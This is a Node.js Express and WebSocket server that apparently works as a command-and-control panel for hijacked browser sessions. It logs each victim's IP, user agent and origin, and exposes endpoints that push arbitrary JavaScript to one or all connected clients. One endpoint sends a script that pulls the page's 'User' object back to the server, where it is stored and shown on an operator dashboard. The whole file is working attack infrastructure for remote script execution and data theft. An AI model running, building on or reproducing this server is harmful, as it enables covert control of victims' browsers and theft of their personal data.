const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 8080;
const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map(); // ws -> { id, info, connectedAt, lastSeen }
let clientIdCounter = 0;
const commandHistory = [];
const userDataStore = {}; // clientId -> latest user data
const messageLog = []; // store recent messages

wss.on('connection', (ws, req) => {
    const clientId = ++clientIdCounter;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';

    const clientInfo = {
        id: clientId,
        ip: ip,
        userAgent: userAgent,
        connectedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        messageCount: 0,
        origin: req.headers['origin'] || 'Unknown'
    };

    clients.set(ws, clientInfo);
    console.log(`Client #${clientId} connected from ${ip}`);

    // Notify admin dashboard clients
    broadcastToAdmins({
        type: 'client_connected',
        client: clientInfo,
        totalClients: clients.size
    });

    ws.on('message', (message) => {
        const msgStr = message.toString();
        clientInfo.lastSeen = new Date().toISOString();
        clientInfo.messageCount++;

        if (msgStr === 'ping') {
            // heartbeat
        } else {
            // Try to parse as JSON (user data response)
            let parsed = null;
            try {
                parsed = JSON.parse(msgStr);
            } catch (e) {
                // not JSON
            }

            const logEntry = {
                clientId: clientId,
                timestamp: new Date().toISOString(),
                raw: msgStr.substring(0, 5000),
                parsed: parsed
            };

            messageLog.push(logEntry);
            if (messageLog.length > 500) messageLog.shift();

            if (parsed) {
                userDataStore[clientId] = {
                    data: parsed,
                    receivedAt: new Date().toISOString()
                };
            }

            // Forward to admin dashboards
            broadcastToAdmins({
                type: 'client_message',
                clientId: clientId,
                data: parsed || msgStr,
                timestamp: logEntry.timestamp
            });

            console.log(`Client #${clientId}: ${msgStr.substring(0, 200)}`);
        }
    });

    ws.on('close', () => {
        console.log(`Client #${clientId} disconnected`);
        broadcastToAdmins({
            type: 'client_disconnected',
            clientId: clientId,
            totalClients: clients.size - 1
        });
        clients.delete(ws);
    });

    ws.on('error', (err) => {
        console.error(`Client #${clientId} error:`, err.message);
        clients.delete(ws);
    });
});

// Admin WebSocket connections (separate tracking)
const adminClients = new Set();

function broadcastToAdmins(data) {
    const msg = JSON.stringify(data);
    for (const aws of adminClients) {
        if (aws.readyState === WebSocket.OPEN) {
            aws.send(msg);
        }
    }
}

// Broadcast JS to all NON-admin clients
app.get('/api/broadcast-js', (req, res) => {
    const { script } = req.query;
    if (typeof script !== 'string') {
        return res.status(400).json({ error: "Missing ?script= in URL" });
    }

    let sentCount = 0;
    for (const [ws, info] of clients) {
        if (ws.readyState === WebSocket.OPEN && !info.isAdmin) {
            ws.send(script);
            sentCount++;
        }
    }

    commandHistory.push({
        script: script,
        sentTo: sentCount,
        timestamp: new Date().toISOString()
    });
    if (commandHistory.length > 200) commandHistory.shift();

    broadcastToAdmins({
        type: 'command_sent',
        script: script,
        sentTo: sentCount,
        timestamp: new Date().toISOString()
    });

    return res.json({ status: 'ok', sentTo: sentCount });
});

// API: Send to specific client
app.get('/api/send-to', (req, res) => {
    const { id, script } = req.query;
    if (!id || !script) {
        return res.status(400).json({ error: "Missing ?id= or ?script=" });
    }

    const targetId = parseInt(id);
    let sent = false;

    for (const [ws, info] of clients) {
        if (info.id === targetId && ws.readyState === WebSocket.OPEN) {
            ws.send(script);
            sent = true;
            break;
        }
    }

    return res.json({ status: sent ? 'ok' : 'client_not_found', clientId: targetId });
});

// API: Get all connected clients
app.get('/api/clients', (req, res) => {
    const list = [];
    for (const [ws, info] of clients) {
        if (!info.isAdmin) {
            list.push({
                ...info,
                readyState: ws.readyState,
                userData: userDataStore[info.id] || null
            });
        }
    }
    return res.json(list);
});

// API: Get user data store
app.get('/api/userdata', (req, res) => {
    return res.json(userDataStore);
});

// API: Get command history
app.get('/api/history', (req, res) => {
    return res.json(commandHistory);
});

// API: Get message log
app.get('/api/messages', (req, res) => {
    const limit = parseInt(req.query.limit) || 100;
    return res.json(messageLog.slice(-limit));
});

// API: Request all users info
app.get('/api/request-user-info', (req, res) => {
    const script = 'window.postMessage({ action: "sendToWS", message: JSON.stringify(typeof User !== "undefined" ? User : {error:"User not defined"}) }, "*");';
    let sentCount = 0;
    for (const [ws, info] of clients) {
        if (ws.readyState === WebSocket.OPEN && !info.isAdmin) {
            ws.send(script);
            sentCount++;
        }
    }
    return res.json({ status: 'ok', sentTo: sentCount });
});

app.get('/screenshot.png', (req, res) => {
    if (fs.existsSync('screenshot.png')) {
        res.sendFile(path.join(__dirname, 'screenshot.png'));
    } else {
        res.status(404).send('No screenshot found');
    }
});

// Serve the admin dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// Admin WebSocket endpoint — admin connects with ?admin=true in protocol or URL
// We'll handle it by having the dashboard connect to the same WS but send an identify message
wss.on('connection', (ws, req) => {
    // Check if this is an admin connection
    if (req.url === '/?admin=true') {
        adminClients.add(ws);
        const ci = clients.get(ws);
        if (ci) ci.isAdmin = true;

        ws.on('close', () => adminClients.delete(ws));
        ws.on('error', () => adminClients.delete(ws));

        // Send current state
        const clientList = [];
        for (const [w, info] of clients) {
            if (!info.isAdmin) {
                clientList.push({
                    ...info,
                    userData: userDataStore[info.id] || null
                });
            }
        }
        ws.send(JSON.stringify({
            type: 'init',
            clients: clientList,
            commandHistory: commandHistory.slice(-50),
            messageLog: messageLog.slice(-100)
        }));
    }
});

server.listen(PORT, () => {
    console.log(`HTTP + WebSocket server listening on port ${PORT}`);
    console.log(`Dashboard: http://localhost:${PORT}`);
    console.log(`WebSocket URL: ws://localhost:${PORT}`);
});
